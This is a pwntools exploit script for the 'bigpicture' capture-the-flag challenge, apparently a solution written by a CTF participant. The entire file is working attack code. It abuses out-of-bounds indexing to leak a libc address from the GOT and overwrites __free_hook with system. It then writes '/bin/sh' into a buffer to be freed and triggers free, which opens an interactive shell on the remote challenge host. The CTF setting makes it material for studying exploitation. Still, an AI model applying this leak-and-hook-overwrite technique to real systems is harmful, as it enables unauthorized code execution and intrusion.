from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']

# remote
got_offset = 0x12afa8
free_hook_offset = 0x128868

# local
got_offset = 0x130fa8
free_hook_offset = 0x12e868

libc_offset = 0x1f876

libc = ELF('./libc-2.23.so')

# r = process('./bigpicture', env={'LD_PRELOAD': './libc-2.23.so'})
# gdb.attach(r, '''
# c
# ''')
r = remote('bigpicture.chal.pwning.xxx', 420)

print r.recvuntil('How big? ')
r.sendline('1000 x 1000')

# leak libc address
print r.recvuntil('> ')
address_in_libc = ''
for i in range(6):
    r.sendline('0 , -' + str(got_offset - i) + ' , A')
    data = r.recvuntil('> ')
    print data
    address_in_libc += data[12]

address_in_libc += '\x00\x00'
address_in_libc = u64(address_in_libc)
log.critical('address in libc: ' + hex(address_in_libc))
libc.address = address_in_libc - libc_offset
log.critical('libc base address: ' + hex(libc.address))
log.critical('system address: ' + hex(libc.symbols['system']))

# override __free_hook to system
for i, byte in enumerate(p64(libc.symbols['system'])[:6]):
    r.sendline('0 , -' + str(free_hook_offset - i) + ' , ' + byte)
    print r.recvuntil('> ')

# write "/bin/sh" to the buffer to be freed
for i, byte in enumerate('/bin/sh'):
    r.sendline('0 , ' + str(i) + ' , ' + byte)
    print r.recvuntil('> ')

# trigger free
r.sendline('quit')

r.interactive()
